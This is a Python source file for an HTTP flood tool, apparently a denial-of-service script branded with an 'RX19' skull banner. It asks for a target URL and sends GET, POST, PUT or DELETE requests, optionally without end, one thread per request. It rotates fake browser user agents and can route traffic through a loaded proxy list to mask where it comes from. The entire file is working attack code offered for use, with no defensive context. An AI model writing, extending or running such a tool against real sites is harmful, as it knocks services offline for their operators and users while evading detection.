import requests
import threading
import random
import time
from termcolor import colored

def print_skull():
    skull = """                                     
 
  ╔══════════════════════════════════════════════════════════╗
  ║  ######################################################  ║ 
  ║  # ╔════════════════════════════════════════════════╗ #  ║
  ║  # ║                                                ║ #  ║
  ║  # ║       ███████╗    ███╗  ███╗  ╔████████        ║ #  ║
  ║  # ║       ██╔══  ██╗   ╚██╗██╔╝   ╚══════███       ║ #  ║
  ║  # ║       ████████╔╝    ╚███╔╝    ╔████████╝       ║ #  ║
  ║  # ║       ██╔═ ██═╝     ██╔██╗    ███              ║ #  ║
  ║  # ║       ██║   ██║   ███╔╝ ███╗  ╚████████║       ║ #  ║
  ║  # ║       ╚═╝   ╚═╝   ╚══╝  ╚══╝   ╚═══════╝       ║ #  ║                   
  ║  # ║                                                ║ #  ║
  ║  # ╚════════════════════════════════════════════════╝ #  ║
  ║  ######################################################  ║
  ╚══════════════════════════════════════════════════════════╝   
  ║ ## ║           THIS TOOL MADE IT BY RX19            ║ ## ║
  ╚════╚════════════════════════════════════════════════╝════╝   
    """
    print(colored(skull, 'red'))

def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def send_request(url, method, proxies):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, proxies=proxies)
        elif method == "POST":
            response = requests.post(url, headers=headers, data={'key': 'value'}, proxies=proxies)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data={'key': 'value'}, proxies=proxies)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers, proxies=proxies)
        else:
            print(colored(f"Invalid method: {method}", 'red'))
            return
        print(colored(f"Request sent to {url} with status code: {response.status_code}", 'cyan'))
    except Exception as e:
        print(colored(f"An error occurred: {e}", 'red'))

def flood(url, count, interval, method, proxy_list):
    print(colored(f"Starting to send {method} requests to {url}...\n", 'green'))

    i = 0
    while count == -1 or i < count:
        try:
            proxy = random.choice(proxy_list) if proxy_list else None
            proxies = {"http": proxy, "https": proxy} if proxy else None
            threading.Thread(target=send_request, args=(url, method, proxies)).start()
            i += 1
            time.sleep(interval)
        except KeyboardInterrupt:
            print(colored("\nOperation cancelled by user.", 'yellow'))
            break

    print(colored("\nFinished sending requests.", 'green'))

if __name__ == "__main__":
    print_skull()
    
    url = input(colored("Enter the target URL (e.g., http://example.com or https): ", 'blue'))
    packet_count = int(input(colored("Enter the number of requests to send (-1 for infinite): ", 'blue')))
    interval = float(input(colored("Enter the interval between requests (in seconds, use 0 for fastest): ", 'blue')))
    method = input(colored("Enter the request method (GET, POST, PUT, DELETE): ", 'blue')).upper()
    
    use_proxies = input(colored("Do you want to use proxies? (yes/no): ", 'blue')).lower() == 'yes'
    proxy_list = []
    
    if use_proxies:
        proxy_file = input(colored("Enter the path to the proxy list file: ", 'blue'))
        try:
            with open(proxy_file, 'r') as file:
                proxy_list = [line.strip() for line in file.readlines()]
            print(colored(f"Loaded {len(proxy_list)} proxies.", 'green'))
        except FileNotFoundError:
            print(colored("Proxy file not found. Continuing without proxies.", 'red'))
            use_proxies = False
    
    flood(url, packet_count, interval, method, proxy_list)
